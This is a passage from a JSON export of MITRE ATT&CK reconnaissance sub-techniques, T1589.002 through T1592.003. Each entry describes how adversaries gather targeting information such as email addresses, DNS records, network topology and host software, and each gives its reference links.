        "external_id": "none"
      },
      {
        "source_name": "GitHub Gitrob",
        "url": "https://github.com/michenriksen/gitrob",
        "description": "Michael Henriksen. (2018, June 9). Gitrob: Putting the Open Source in OSINT. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "CNET Leaks",
        "url": "https://www.cnet.com/news/massive-breach-leaks-773-million-emails-21-million-passwords/",
        "description": "Ng, A. (2019, January 17). Massive breach leaks 773 million email addresses, 21 million passwords. Retrieved October 20, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--69f897fd-12a9-4c89-ad6a-46d2f3c38262",
    "platform": "pre",
    "tid": "T1589.002",
    "technique": "Email Addresses",
    "tactic": "reconnaissance",
    "datasources": "none",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may gather email addresses that can be used during targeting. Even if internal instances exist, organizations may have public-facing email infrastructure and addresses for employees.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may easily gather email addresses, since they may be readily available and exposed via online or other accessible data sets (ex: <a href=\"https://attack.mitre.org/techniques/T1593/001\">Social Media</a> or <a href=\"https://attack.mitre.org/techniques/T1594\">Search Victim-Owned Websites</a>).(Citation: HackersArise Email)(Citation: CNET Leaks) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: <a href=\"https://attack.mitre.org/techniques/T1593\">Search Open Websites/Domains</a> or <a href=\"https://attack.mitre.org/techniques/T1598\">Phishing for Information</a>), establishing operational resources (ex: <a href=\"https://attack.mitre.org/techniques/T1586/002\">Email Accounts</a>), and/or initial access (ex: <a href=\"https://attack.mitre.org/techniques/T1566\">Phishing</a>).</p>\n",
    "technique_references": [
      {
        "source_name": "HackersArise Email",
        "url": "https://www.hackers-arise.com/email-scraping-and-maltego",
        "description": "Hackers Arise. (n.d.). Email Scraping and Maltego. Retrieved October 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "CNET Leaks",
        "url": "https://www.cnet.com/news/massive-breach-leaks-773-million-emails-21-million-passwords/",
        "description": "Ng, A. (2019, January 17). Massive breach leaks 773 million email addresses, 21 million passwords. Retrieved October 20, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--76551c52-b111-4884-bc47-ff3e728f0156",
    "platform": "pre",
    "tid": "T1589.003",
    "technique": "Employee Names",
    "tactic": "reconnaissance",
    "datasources": "none",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may gather employee names that can be used during targeting. Employee names be used to derive email addresses as well as to help guide other reconnaissance efforts and/or craft more-believable lures.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may easily gather employee names, since they may be readily available and exposed via online or other accessible data sets (ex: <a href=\"https://attack.mitre.org/techniques/T1593/001\">Social Media</a> or <a href=\"https://attack.mitre.org/techniques/T1594\">Search Victim-Owned Websites</a>).(Citation: OPM Leak) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: <a href=\"https://attack.mitre.org/techniques/T1593\">Search Open Websites/Domains</a> or <a href=\"https://attack.mitre.org/techniques/T1598\">Phishing for Information</a>), establishing operational resources (ex: <a href=\"https://attack.mitre.org/techniques/T1586\">Compromise Accounts</a>), and/or initial access (ex: <a href=\"https://attack.mitre.org/techniques/T1566\">Phishing</a> or <a href=\"https://attack.mitre.org/techniques/T1078\">Valid Accounts</a>).</p>\n",
    "technique_references": [
      {
        "source_name": "OPM Leak",
        "url": "https://www.opm.gov/cybersecurity/cybersecurity-incidents/",
        "description": "Cybersecurity Resource Center. (n.d.). CYBERSECURITY INCIDENTS. Retrieved October 20, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--e3b168bd-fcd7-439e-9382-2e6c2f63514d",
    "platform": "pre",
    "tid": "T1590.001",
    "technique": "Domain Properties",
    "tactic": "reconnaissance",
    "datasources": "none",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may gather information about the victim’s network domain(s) that can be used during targeting. Information about domains and their properties may include a variety of details, including what domain(s) the victim owns as well as administrative data (ex: name, registrar, etc.) and more directly actionable information such as contacts (email addresses and phone numbers), business addresses, and name servers.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may gather this information in various ways, such as direct collection actions via <a href=\"https://attack.mitre.org/techniques/T1595\">Active Scanning</a> or <a href=\"https://attack.mitre.org/techniques/T1598\">Phishing for Information</a>. Information about victim domains and their properties may also be exposed to adversaries via online or other accessible data sets (ex: <a href=\"https://attack.mitre.org/techniques/T1596/002\">WHOIS</a>).(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: <a href=\"https://attack.mitre.org/techniques/T1596\">Search Open Technical Databases</a>, <a href=\"https://attack.mitre.org/techniques/T1593\">Search Open Websites/Domains</a>, or <a href=\"https://attack.mitre.org/techniques/T1598\">Phishing for Information</a>), establishing operational resources (ex: <a href=\"https://attack.mitre.org/techniques/T1583\">Acquire Infrastructure</a> or <a href=\"https://attack.mitre.org/techniques/T1584\">Compromise Infrastructure</a>), and/or initial access (ex: <a href=\"https://attack.mitre.org/techniques/T1566\">Phishing</a>).</p>\n",
    "technique_references": [
      {
        "source_name": "WHOIS",
        "url": "https://www.whois.net/",
        "description": "NTT America. (n.d.). Whois Lookup. Retrieved October 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "DNS Dumpster",
        "url": "https://dnsdumpster.com/",
        "description": "Hacker Target. (n.d.). DNS Dumpster. Retrieved October 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Circl Passive DNS",
        "url": "https://www.circl.lu/services/passive-dns/",
        "description": "CIRCL Computer Incident Response Center. (n.d.). Passive DNS. Retrieved October 20, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--0ff59227-8aa8-4c09-bf1f-925605bd07ea",
    "platform": "pre",
    "tid": "T1590.002",
    "technique": "DNS",
    "tactic": "reconnaissance",
    "datasources": "none",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may gather information about the victim’s DNS that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a target’s subdomains, mail servers, and other hosts.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may gather this information in various ways, such as querying or otherwise collecting details via <a href=\"https://attack.mitre.org/techniques/T1596/001\">DNS/Passive DNS</a>. DNS information may also be exposed to adversaries via online or other accessible data sets (ex: <a href=\"https://attack.mitre.org/techniques/T1596\">Search Open Technical Databases</a>).(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: <a href=\"https://attack.mitre.org/techniques/T1596\">Search Open Technical Databases</a>, <a href=\"https://attack.mitre.org/techniques/T1593\">Search Open Websites/Domains</a>, or <a href=\"https://attack.mitre.org/techniques/T1595\">Active Scanning</a>), establishing operational resources (ex: <a href=\"https://attack.mitre.org/techniques/T1583\">Acquire Infrastructure</a> or <a href=\"https://attack.mitre.org/techniques/T1584\">Compromise Infrastructure</a>), and/or initial access (ex: <a href=\"https://attack.mitre.org/techniques/T1133\">External Remote Services</a>).</p>\n",
    "technique_references": [
      {
        "source_name": "DNS Dumpster",
        "url": "https://dnsdumpster.com/",
        "description": "Hacker Target. (n.d.). DNS Dumpster. Retrieved October 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Circl Passive DNS",
        "url": "https://www.circl.lu/services/passive-dns/",
        "description": "CIRCL Computer Incident Response Center. (n.d.). Passive DNS. Retrieved October 20, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--36aa137f-5166-41f8-b2f0-a4cfa1b4133e",
    "platform": "pre",
    "tid": "T1590.003",
    "technique": "Network Trust Dependencies",
    "tactic": "reconnaissance",
    "datasources": "none",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may gather information about the victim’s network trust dependencies that can be used during targeting. Information about network trusts may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may gather this information in various ways, such as direct elicitation via <a href=\"https://attack.mitre.org/techniques/T1598\">Phishing for Information</a>. Information about network trusts may also be exposed to adversaries via online or other accessible data sets (ex: <a href=\"https://attack.mitre.org/techniques/T1596\">Search Open Technical Databases</a>).(Citation: Pentesting AD Forests) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: <a href=\"https://attack.mitre.org/techniques/T1595\">Active Scanning</a> or <a href=\"https://attack.mitre.org/techniques/T1593\">Search Open Websites/Domains</a>), establishing operational resources (ex: <a href=\"https://attack.mitre.org/techniques/T1583\">Acquire Infrastructure</a> or <a href=\"https://attack.mitre.org/techniques/T1584\">Compromise Infrastructure</a>), and/or initial access (ex: <a href=\"https://attack.mitre.org/techniques/T1199\">Trusted Relationship</a>).</p>\n",
    "technique_references": [
      {
        "source_name": "Pentesting AD Forests",
        "url": "https://www.slideshare.net/rootedcon/carlos-garca-pentesting-active-directory-forests-rooted2019",
        "description": "García, C. (2019, April 3). Pentesting Active Directory Forests. Retrieved October 20, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--34ab90a3-05f6-4259-8f21-621081fdaba5",
    "platform": "pre",
    "tid": "T1590.004",
    "technique": "Network Topology",
    "tactic": "reconnaissance",
    "datasources": "none",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may gather information about the victim’s network topology that can be used during targeting. Information about network topologies may include a variety of details, including the physical and/or logical arrangement of both external-facing and internal network environments. This information may also include specifics regarding network devices (gateways, routers, etc.) and other infrastructure.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may gather this information in various ways, such as direct collection actions via <a href=\"https://attack.mitre.org/techniques/T1595\">Active Scanning</a> or <a href=\"https://attack.mitre.org/techniques/T1598\">Phishing for Information</a>. Information about network topologies may also be exposed to adversaries via online or other accessible data sets (ex: <a href=\"https://attack.mitre.org/techniques/T1594\">Search Victim-Owned Websites</a>).(Citation: DNS Dumpster) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: <a href=\"https://attack.mitre.org/techniques/T1596\">Search Open Technical Databases</a> or <a href=\"https://attack.mitre.org/techniques/T1593\">Search Open Websites/Domains</a>), establishing operational resources (ex: <a href=\"https://attack.mitre.org/techniques/T1583\">Acquire Infrastructure</a> or <a href=\"https://attack.mitre.org/techniques/T1584\">Compromise Infrastructure</a>), and/or initial access (ex: <a href=\"https://attack.mitre.org/techniques/T1133\">External Remote Services</a>).</p>\n",
    "technique_references": [
      {
        "source_name": "DNS Dumpster",
        "url": "https://dnsdumpster.com/",
        "description": "Hacker Target. (n.d.). DNS Dumpster. Retrieved October 20, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--0dda99f0-4701-48ca-9774-8504922e92d3",
    "platform": "pre",
    "tid": "T1590.005",
    "technique": "IP Addresses",
    "tactic": "reconnaissance",
    "datasources": "none",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may gather the victim’s IP addresses that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses. Information about assigned IP addresses may include a variety of details, such as which IP addresses are in use. IP addresses may also enable an adversary to derive other details about a victim, such as organizational size, physical location(s), Internet service provider, and or where/how their publicly-facing infrastructure is hosted.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may gather this information in various ways, such as direct collection actions via <a href=\"https://attack.mitre.org/techniques/T1595\">Active Scanning</a> or <a href=\"https://attack.mitre.org/techniques/T1598\">Phishing for Information</a>. Information about assigned IP addresses may also be exposed to adversaries via online or other accessible data sets (ex: <a href=\"https://attack.mitre.org/techniques/T1596\">Search Open Technical Databases</a>).(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: <a href=\"https://attack.mitre.org/techniques/T1595\">Active Scanning</a> or <a href=\"https://attack.mitre.org/techniques/T1593\">Search Open Websites/Domains</a>), establishing operational resources (ex: <a href=\"https://attack.mitre.org/techniques/T1583\">Acquire Infrastructure</a> or <a href=\"https://attack.mitre.org/techniques/T1584\">Compromise Infrastructure</a>), and/or initial access (ex: <a href=\"https://attack.mitre.org/techniques/T1133\">External Remote Services</a>).</p>\n",
    "technique_references": [
      {
        "source_name": "WHOIS",
        "url": "https://www.whois.net/",
        "description": "NTT America. (n.d.). Whois Lookup. Retrieved October 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "DNS Dumpster",
        "url": "https://dnsdumpster.com/",
        "description": "Hacker Target. (n.d.). DNS Dumpster. Retrieved October 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Circl Passive DNS",
        "url": "https://www.circl.lu/services/passive-dns/",
        "description": "CIRCL Computer Incident Response Center. (n.d.). Passive DNS. Retrieved October 20, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--6c2957f9-502a-478c-b1dd-d626c0659413",
    "platform": "pre",
    "tid": "T1590.006",
    "technique": "Network Security Appliances",
    "tactic": "reconnaissance",
    "datasources": "none",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may gather information about the victim’s network security appliances that can be used during targeting. Information about network security appliances may include a variety of details, such as the existence and specifics of deployed firewalls, content filters, and proxies/bastion hosts. Adversaries may also target information about victim network-based intrusion detection systems (NIDS) or other appliances related to defensive cybersecurity operations.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may gather this information in various ways, such as direct collection actions via <a href=\"https://attack.mitre.org/techniques/T1595\">Active Scanning</a> or <a href=\"https://attack.mitre.org/techniques/T1598\">Phishing for Information</a>.(Citation: Nmap Firewalls NIDS) Information about network security appliances may also be exposed to adversaries via online or other accessible data sets (ex: <a href=\"https://attack.mitre.org/techniques/T1594\">Search Victim-Owned Websites</a>). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: <a href=\"https://attack.mitre.org/techniques/T1596\">Search Open Technical Databases</a> or <a href=\"https://attack.mitre.org/techniques/T1593\">Search Open Websites/Domains</a>), establishing operational resources (ex: <a href=\"https://attack.mitre.org/techniques/T1587\">Develop Capabilities</a> or <a href=\"https://attack.mitre.org/techniques/T1588\">Obtain Capabilities</a>), and/or initial access (ex: <a href=\"https://attack.mitre.org/techniques/T1133\">External Remote Services</a>).</p>\n",
    "technique_references": [
      {
        "source_name": "Nmap Firewalls NIDS",
        "url": "https://nmap.org/book/firewalls.html",
        "description": "Nmap. (n.d.). Chapter 10. Detecting and Subverting Firewalls and Intrusion Detection Systems. Retrieved October 20, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--ed730f20-0e44-48b9-85f8-0e2adeb76867",
    "platform": "pre",
    "tid": "T1591.001",
    "technique": "Determine Physical Locations",
    "tactic": "reconnaissance",
    "datasources": "none",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may gather the victim’s physical location(s) that can be used during targeting. Information about physical locations of a target organization may include a variety of details, including where key resources and infrastructure are housed. Physical locations may also indicate what legal jurisdiction and/or authorities the victim operates within.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may gather this information in various ways, such as direct elicitation via <a href=\"https://attack.mitre.org/techniques/T1598\">Phishing for Information</a>. Physical locations of a target organization may also be exposed to adversaries via online or other accessible data sets (ex: <a href=\"https://attack.mitre.org/techniques/T1594\">Search Victim-Owned Websites</a> or <a href=\"https://attack.mitre.org/techniques/T1593/001\">Social Media</a>).(Citation: ThreatPost Broadvoice Leak)(Citation: DOB Business Lookup) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: <a href=\"https://attack.mitre.org/techniques/T1598\">Phishing for Information</a> or <a href=\"https://attack.mitre.org/techniques/T1593\">Search Open Websites/Domains</a>), establishing operational resources (ex: <a href=\"https://attack.mitre.org/techniques/T1587\">Develop Capabilities</a> or <a href=\"https://attack.mitre.org/techniques/T1588\">Obtain Capabilities</a>), and/or initial access (ex: <a href=\"https://attack.mitre.org/techniques/T1566\">Phishing</a> or <a href=\"https://attack.mitre.org/techniques/T1200\">Hardware Additions</a>).</p>\n",
    "technique_references": [
      {
        "source_name": "ThreatPost Broadvoice Leak",
        "url": "https://threatpost.com/broadvoice-leaks-350m-records-voicemail-transcripts/160158/",
        "description": "Seals, T. (2020, October 15). Broadvoice Leak Exposes 350M Records, Personal Voicemail Transcripts. Retrieved October 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "DOB Business Lookup",
        "url": "https://www.dobsearch.com/business-lookup/",
        "description": "Concert Technologies . (n.d.). Business Lookup - Company Name Search. Retrieved October 20, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--6ee2dc99-91ad-4534-a7d8-a649358c331f",
    "platform": "pre",
    "tid": "T1591.002",
    "technique": "Business Relationships",
    "tactic": "reconnaissance",
    "datasources": "none",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may gather information about the victim’s business relationships that can be used during targeting. Information about an organization’s business relationships may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access. This information may also reveal supply chains and shipment paths for the victim’s hardware and software resources.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may gather this information in various ways, such as direct elicitation via <a href=\"https://attack.mitre.org/techniques/T1598\">Phishing for Information</a>. Information about business relationships may also be exposed to adversaries via online or other accessible data sets (ex: <a href=\"https://attack.mitre.org/techniques/T1593/001\">Social Media</a> or <a href=\"https://attack.mitre.org/techniques/T1594\">Search Victim-Owned Websites</a>).(Citation: ThreatPost Broadvoice Leak) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: <a href=\"https://attack.mitre.org/techniques/T1598\">Phishing for Information</a> or <a href=\"https://attack.mitre.org/techniques/T1593\">Search Open Websites/Domains</a>), establishing operational resources (ex: <a href=\"https://attack.mitre.org/techniques/T1585\">Establish Accounts</a> or <a href=\"https://attack.mitre.org/techniques/T1586\">Compromise Accounts</a>), and/or initial access (ex: <a href=\"https://attack.mitre.org/techniques/T1195\">Supply Chain Compromise</a>, <a href=\"https://attack.mitre.org/techniques/T1189\">Drive-by Compromise</a>, or <a href=\"https://attack.mitre.org/techniques/T1199\">Trusted Relationship</a>).</p>\n",
    "technique_references": [
      {
        "source_name": "ThreatPost Broadvoice Leak",
        "url": "https://threatpost.com/broadvoice-leaks-350m-records-voicemail-transcripts/160158/",
        "description": "Seals, T. (2020, October 15). Broadvoice Leak Exposes 350M Records, Personal Voicemail Transcripts. Retrieved October 20, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--2339cf19-8f1e-48f7-8a91-0262ba547b6f",
    "platform": "pre",
    "tid": "T1591.003",
    "technique": "Identify Business Tempo",
    "tactic": "reconnaissance",
    "datasources": "none",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may gather information about the victim’s business tempo that can be used during targeting. Information about an organization’s business tempo may include a variety of details, including operational hours/days of the week. This information may also reveal times/dates of purchases and shipments of the victim’s hardware and software resources.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may gather this information in various ways, such as direct elicitation via <a href=\"https://attack.mitre.org/techniques/T1598\">Phishing for Information</a>. Information about business tempo may also be exposed to adversaries via online or other accessible data sets (ex: <a href=\"https://attack.mitre.org/techniques/T1593/001\">Social Media</a> or <a href=\"https://attack.mitre.org/techniques/T1594\">Search Victim-Owned Websites</a>).(Citation: ThreatPost Broadvoice Leak) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: <a href=\"https://attack.mitre.org/techniques/T1598\">Phishing for Information</a> or <a href=\"https://attack.mitre.org/techniques/T1593\">Search Open Websites/Domains</a>), establishing operational resources (ex: <a href=\"https://attack.mitre.org/techniques/T1585\">Establish Accounts</a> or <a href=\"https://attack.mitre.org/techniques/T1586\">Compromise Accounts</a>), and/or initial access (ex: <a href=\"https://attack.mitre.org/techniques/T1195\">Supply Chain Compromise</a> or <a href=\"https://attack.mitre.org/techniques/T1199\">Trusted Relationship</a>)</p>\n",
    "technique_references": [
      {
        "source_name": "ThreatPost Broadvoice Leak",
        "url": "https://threatpost.com/broadvoice-leaks-350m-records-voicemail-transcripts/160158/",
        "description": "Seals, T. (2020, October 15). Broadvoice Leak Exposes 350M Records, Personal Voicemail Transcripts. Retrieved October 20, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--cc723aff-ec88-40e3-a224-5af9fd983cc4",
    "platform": "pre",
    "tid": "T1591.004",
    "technique": "Identify Roles",
    "tactic": "reconnaissance",
    "datasources": "none",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may gather information about identities and roles within the victim organization that can be used during targeting. Information about business roles may reveal a variety of targetable details, including identifiable information for key personnel as well as what data/resources they have access to.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may gather this information in various ways, such as direct elicitation via <a href=\"https://attack.mitre.org/techniques/T1598\">Phishing for Information</a>. Information about business roles may also be exposed to adversaries via online or other accessible data sets (ex: <a href=\"https://attack.mitre.org/techniques/T1593/001\">Social Media</a> or <a href=\"https://attack.mitre.org/techniques/T1594\">Search Victim-Owned Websites</a>).(Citation: ThreatPost Broadvoice Leak) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: <a href=\"https://attack.mitre.org/techniques/T1598\">Phishing for Information</a> or <a href=\"https://attack.mitre.org/techniques/T1593\">Search Open Websites/Domains</a>), establishing operational resources (ex: <a href=\"https://attack.mitre.org/techniques/T1585\">Establish Accounts</a> or <a href=\"https://attack.mitre.org/techniques/T1586\">Compromise Accounts</a>), and/or initial access (ex: <a href=\"https://attack.mitre.org/techniques/T1566\">Phishing</a>).</p>\n",
    "technique_references": [
      {
        "source_name": "ThreatPost Broadvoice Leak",
        "url": "https://threatpost.com/broadvoice-leaks-350m-records-voicemail-transcripts/160158/",
        "description": "Seals, T. (2020, October 15). Broadvoice Leak Exposes 350M Records, Personal Voicemail Transcripts. Retrieved October 20, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--24286c33-d4a4-4419-85c2-1d094a896c26",
    "platform": "pre",
    "tid": "T1592.001",
    "technique": "Hardware",
    "tactic": "reconnaissance",
    "datasources": "none",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may gather information about the victim’s host hardware that can be used during targeting. Information about hardware infrastructure may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: card/biometric readers, dedicated encryption hardware, etc.).<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may gather this information in various ways, such as direct collection actions via <a href=\"https://attack.mitre.org/techniques/T1595\">Active Scanning</a> (ex: hostnames, server banners, user agent strings) or <a href=\"https://attack.mitre.org/techniques/T1598\">Phishing for Information</a>. Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about the hardware infrastructure may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: <a href=\"https://attack.mitre.org/techniques/T1593\">Search Open Websites/Domains</a> or <a href=\"https://attack.mitre.org/techniques/T1596\">Search Open Technical Databases</a>), establishing operational resources (ex: <a href=\"https://attack.mitre.org/techniques/T1587\">Develop Capabilities</a> or <a href=\"https://attack.mitre.org/techniques/T1588\">Obtain Capabilities</a>), and/or initial access (ex: <a href=\"https://attack.mitre.org/techniques/T1195/003\">Compromise Hardware Supply Chain</a> or <a href=\"https://attack.mitre.org/techniques/T1200\">Hardware Additions</a>).</p>\n",
    "technique_references": [
      {
        "source_name": "ATT ScanBox",
        "url": "https://cybersecurity.att.com/blogs/labs-research/scanbox-a-reconnaissance-framework-used-on-watering-hole-attacks",
        "description": "Blasco, J. (2014, August 28). Scanbox: A Reconnaissance Framework Used with Watering Hole Attacks. Retrieved October 19, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--baf60e1a-afe5-4d31-830f-1b1ba2351884",
    "platform": "pre",
    "tid": "T1592.002",
    "technique": "Software",
    "tactic": "reconnaissance",
    "datasources": "none",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may gather information about the victim’s host software that can be used during targeting. Information about installed software may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: antivirus, SIEMs, etc.).<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may gather this information in various ways, such as direct collection actions via <a href=\"https://attack.mitre.org/techniques/T1595\">Active Scanning</a> (ex: listening ports, server banners, user agent strings) or <a href=\"https://attack.mitre.org/techniques/T1598\">Phishing for Information</a>. Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about the installed software may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: <a href=\"https://attack.mitre.org/techniques/T1593\">Search Open Websites/Domains</a> or <a href=\"https://attack.mitre.org/techniques/T1596\">Search Open Technical Databases</a>), establishing operational resources (ex: <a href=\"https://attack.mitre.org/techniques/T1587\">Develop Capabilities</a> or <a href=\"https://attack.mitre.org/techniques/T1588\">Obtain Capabilities</a>), and/or for initial access (ex: <a href=\"https://attack.mitre.org/techniques/T1195\">Supply Chain Compromise</a> or <a href=\"https://attack.mitre.org/techniques/T1133\">External Remote Services</a>).</p>\n",
    "technique_references": [
      {
        "source_name": "ATT ScanBox",
        "url": "https://cybersecurity.att.com/blogs/labs-research/scanbox-a-reconnaissance-framework-used-on-watering-hole-attacks",
        "description": "Blasco, J. (2014, August 28). Scanbox: A Reconnaissance Framework Used with Watering Hole Attacks. Retrieved October 19, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--b85f6ce5-81e8-4f36-aff2-3df9d02a9c9d",
    "platform": "pre",
    "tid": "T1592.003",
    "technique": "Firmware",
    "tactic": "reconnaissance",
    "datasources": "none",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
